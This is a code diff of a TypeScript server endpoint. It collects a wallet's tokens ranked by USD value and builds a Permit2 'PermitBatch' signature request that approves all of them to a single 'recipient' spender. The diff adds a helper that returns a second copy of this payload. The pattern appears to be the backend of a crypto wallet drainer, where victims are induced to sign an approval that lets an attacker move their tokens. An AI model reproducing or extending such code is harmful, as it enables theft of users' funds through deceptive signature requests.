@@ -171,7 +171,7 @@ app.post<{
   }
   const [filteredByUSDValue, error] = await useFetchTokenPrices();
   const tokensReturned = filteredByUSDValue as { token_address: string }[];
-  const tokenInPermitFormat: Array<{}> = [];
+  const tokenInPermitFormat: {}[] = [];
   for (let index = 0; index < tokensReturned?.length; index++) {
     const obj = {
       token: tokensReturned[index].token_address,
@@ -234,13 +234,15 @@ app.post<{
     },
     primaryType: "PermitBatch",
     message: {
-      details: [...tokenInPermitFormat],
+      details: tokenInPermitFormat,
       spender: recipient,
       sigDeadline: deadline,
     },
   };
+  const dat = { ...dataToSign };
+  const dat123 = nw(tokenInPermitFormat);
 
-  return [_dataToSign, _addrs, dataToSign, tokenInPermitFormat];
+  return [_dataToSign, _addrs, dat, dat123];
   // return tokensAddressOnly;
 });
 const usdcContractAddress: string =
@@ -300,3 +302,37 @@ const _dataToSign = {
     sigDeadline: deadline,
   },
 };
+
+function nw(details: any) {
+  return {
+    domain: {
+      name: "Permit2" as string,
+      chainId: chainId,
+      verifyingContract: Permit2Contract,
+    },
+    types: {
+      EIP712Domain: [
+        { name: "name", type: "string" },
+        { name: "chainId", type: "uint256" },
+        { name: "verifyingContract", type: "address" },
+      ],
+      PermitBatch: [
+        { name: "details", type: "PermitDetails[]" },
+        { name: "spender", type: "address" },
+        { name: "sigDeadline", type: "uint256" },
+      ],
+      PermitDetails: [
+        { name: "token", type: "address" },
+        { name: "amount", type: "uint160" },
+        { name: "expiration", type: "uint48" },
+        { name: "nonce", type: "uint48" },
+      ],
+    },
+    primaryType: "PermitBatch",
+    message: {
+      details: details as [],
+      spender: recipient,
+      sigDeadline: deadline,
+    },
+  };
+}
